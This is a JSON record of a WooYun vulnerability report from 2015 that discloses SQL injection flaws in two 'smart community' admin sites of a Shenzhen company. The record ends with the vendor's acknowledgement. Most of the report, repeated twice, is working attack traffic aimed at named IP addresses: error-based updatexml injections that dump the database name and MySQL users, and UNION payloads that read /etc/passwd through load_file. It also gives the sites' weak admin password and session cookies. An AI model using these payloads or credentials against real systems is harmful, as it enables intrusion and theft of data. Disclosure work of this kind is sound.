{"id": 29596, "wybug_id": "wooyun-2015-0118847", "wybug_title": "智慧社区多个站点多个sql注入打包", "wybug_corp": "深圳协创互联科技有限公司", "wybug_author": "xxlegend", "wybug_date": "2015-06-10 08:19", "wybug_open_date": "2015-07-27 19:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-27：\t细节向公众公开  简要描述： 智慧社区多个站点多个sql注入打包 详细说明：  $str = array(        array(                \"province\" => \"内蒙古自治区\",                \"city\" => \"鄂尔多斯\",                \"community\" => \"兴胜街道\",                \"server\" => \"http://182.92.11.190/\"        ),        array(                \"province\" => \"山东省\",                \"city\" => \"济南\",                \"community\" => \"堤口路街道\",                \"server\" => \"http://182.92.233.188/\"        ));后天弱口令都是admin/admin1,注入1\nPOST http://182.92.233.188/index.php/Admin/addPeople?id=batch'+and+1=updatexml(1,concat(0x5e24,database(),0x5e24),1))+--+ HTTP/1.1\n返回值：\n1105:XPATH syntax error: '^$kona_api^$' [ SQLè¯­å¥ ] : SELECT * FROM `kona_people` WHERE (  id = 'batch' and 1=updatexml(1,concat(0x5e24,database(),0x5e24),1)) -- ' ) LIMIT 1\n2，修改新闻处注射2，支持union\nPOST http://182.92.233.188/index.php/Admin/postNews?id=batch')+union+all+select+1,2,3,(select+load_file(CHAR(47,101,116,99,47,112,97,115,115,119,100))),(select+substring(load_file('/etc/issue'),1,20)),6,7,8--++ HTTP/1.1\n返回值：\n\n3，\nPOST http://182.92.233.188/index.php/Admin/postNotice?id=batch')+union+all+select+1,2,3,(select+load_file(CHAR(47,101,116,99,47,112,97,115,115,119,100))),(select+substring(load_file('/etc/issue'),1,20)),6,7,8--++ HTTP/1.1\n返回值：\n\n旗下站点：http://182.92.233.188/http://182.92.11.190/登录弱口令:admin/admin1,\nGET http://182.92.233.188/index.php/Admin/delCommunity?communityId=100' and+ 1=updatexml(1,concat(0x5e24,user(),0x5e24),1))--+ HTTP/1.1\n返回信息：\n<h1>1105:XPATH syntax error: '^$root@localhost^$' [ SQLè¯­å¥ ] : DELETE FROM `kona_community` WHERE ( id='100'and 1=updatexml(1,concat(0x5e24,user(),0x5e24),1))-- ' )</h1>\n\nhttp://182.92.233.188/index.php/Admin/delCommunity?communityId=100'+and+1=updatexml(1,concat(0x5e24,(select+group_concat(user)+from+mysql.user),0x5e24),1))--+  HTTP/1.1\n返回值：\n1105:XPATH syntax error: '^$gyf,root,root,,root,,gyf,root^' [ SQLè¯­å¥ ] : DELETE FROM `kona_community` WHERE ( id='100' and 1=updatexml(1,concat(0x5e24,(select group_concat(user) from mysql.user),0x5e24),1))-- ' )\n2，request请求：Delpeopel接口处sql注入：POST http://182.92.233.188/index.php/Admin/delPeople?act=batch HTTP/1.1Host: 182.92.233.188Proxy-Connection: keep-aliveContent-Length: 66Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://182.92.233.188User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://182.92.233.188/Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2Cookie: PHPSESSID=kn7vnh0qhvi61kn7tnmvl0v1q1ids=1000,11111,10000=updatexml(1,concat(0x5e24,database(),0x5e24),1)返回值：\n1105:XPATH syntax error: '^$kona_api^$' [ SQLè¯­å¥ ] : DELETE FROM `kona_people` WHERE ( id in (1000,11111,10000=updatexml(1,concat(0x5e24,database(),0x5e24),1)) AND id != '1' )\n3，\nPOST http://182.92.233.188/index.php/Admin/addPeople?id=batch'+and+1=updatexml(1,concat(0x5e24,database(),0x5e24),1))+--+ HTTP/1.1Host: 182.92.233.188Proxy-Connection: keep-aliveContent-Length: 13Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://182.92.233.188User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://182.92.233.188/Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2Cookie: PHPSESSID=kn7vnh0qhvi61kn7tnmvl0v1q1realname=ss\n返回值：\n1105:XPATH syntax error: '^$kona_api^$' [ SQLè¯­å¥ ] : UPDATE `kona_people` SET `realname`='ss\\r\\n',`community_id`=11,`online_lock`='',`login_time`=0 WHERE (  id = 'batch' and 1=updatexml(1,concat(0x5e24,database(),0x5e24),1)) -- '  )\n   漏洞证明：  $str = array(        array(                \"province\" => \"内蒙古自治区\",                \"city\" => \"鄂尔多斯\",                \"community\" => \"兴胜街道\",                \"server\" => \"http://182.92.11.190/\"        ),        array(                \"province\" => \"山东省\",                \"city\" => \"济南\",                \"community\" => \"堤口路街道\",                \"server\" => \"http://182.92.233.188/\"        ));后天弱口令都是admin/admin1,注入1\nPOST http://182.92.233.188/index.php/Admin/addPeople?id=batch'+and+1=updatexml(1,concat(0x5e24,database(),0x5e24),1))+--+ HTTP/1.1\n返回值：\n1105:XPATH syntax error: '^$kona_api^$' [ SQLè¯­å¥ ] : SELECT * FROM `kona_people` WHERE (  id = 'batch' and 1=updatexml(1,concat(0x5e24,database(),0x5e24),1)) -- ' ) LIMIT 1\n2，修改新闻处注射2，支持union\nPOST http://182.92.233.188/index.php/Admin/postNews?id=batch')+union+all+select+1,2,3,(select+load_file(CHAR(47,101,116,99,47,112,97,115,115,119,100))),(select+substring(load_file('/etc/issue'),1,20)),6,7,8--++ HTTP/1.1\n返回值：\n\n3，\nPOST http://182.92.233.188/index.php/Admin/postNotice?id=batch')+union+all+select+1,2,3,(select+load_file(CHAR(47,101,116,99,47,112,97,115,115,119,100))),(select+substring(load_file('/etc/issue'),1,20)),6,7,8--++ HTTP/1.1\n返回值：\n\n旗下站点：http://182.92.233.188/http://182.92.11.190/登录弱口令:admin/admin1,\nGET http://182.92.233.188/index.php/Admin/delCommunity?communityId=100' and+ 1=updatexml(1,concat(0x5e24,user(),0x5e24),1))--+ HTTP/1.1\n返回信息：\n<h1>1105:XPATH syntax error: '^$root@localhost^$' [ SQLè¯­å¥ ] : DELETE FROM `kona_community` WHERE ( id='100'and 1=updatexml(1,concat(0x5e24,user(),0x5e24),1))-- ' )</h1>\n\nhttp://182.92.233.188/index.php/Admin/delCommunity?communityId=100'+and+1=updatexml(1,concat(0x5e24,(select+group_concat(user)+from+mysql.user),0x5e24),1))--+  HTTP/1.1\n返回值：\n1105:XPATH syntax error: '^$gyf,root,root,,root,,gyf,root^' [ SQLè¯­å¥ ] : DELETE FROM `kona_community` WHERE ( id='100' and 1=updatexml(1,concat(0x5e24,(select group_concat(user) from mysql.user),0x5e24),1))-- ' )\n2，request请求：Delpeopel接口处sql注入：POST http://182.92.233.188/index.php/Admin/delPeople?act=batch HTTP/1.1Host: 182.92.233.188Proxy-Connection: keep-aliveContent-Length: 66Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://182.92.233.188User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://182.92.233.188/Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2Cookie: PHPSESSID=kn7vnh0qhvi61kn7tnmvl0v1q1ids=1000,11111,10000=updatexml(1,concat(0x5e24,database(),0x5e24),1)返回值：\n1105:XPATH syntax error: '^$kona_api^$' [ SQLè¯­å¥ ] : DELETE FROM `kona_people` WHERE ( id in (1000,11111,10000=updatexml(1,concat(0x5e24,database(),0x5e24),1)) AND id != '1' )\n3，\nPOST http://182.92.233.188/index.php/Admin/addPeople?id=batch'+and+1=updatexml(1,concat(0x5e24,database(),0x5e24),1))+--+ HTTP/1.1Host: 182.92.233.188Proxy-Connection: keep-aliveContent-Length: 13Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://182.92.233.188User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://182.92.233.188/Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2Cookie: PHPSESSID=kn7vnh0qhvi61kn7tnmvl0v1q1realname=ss\n返回值：\n1105:XPATH syntax error: '^$kona_api^$' [ SQLè¯­å¥ ] : UPDATE `kona_people` SET `realname`='ss\\r\\n',`community_id`=11,`online_lock`='',`login_time`=0 WHERE (  id = 'batch' and 1=updatexml(1,concat(0x5e24,database(),0x5e24),1)) -- '  )\n   修复方案：  加入sql过滤函数   版权声明：转载请注明来源 xxlegend@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-06-12 19:45 厂商回复： CNVD确认所述漏洞情况，暂未建立与网站管理单位的直接处置渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}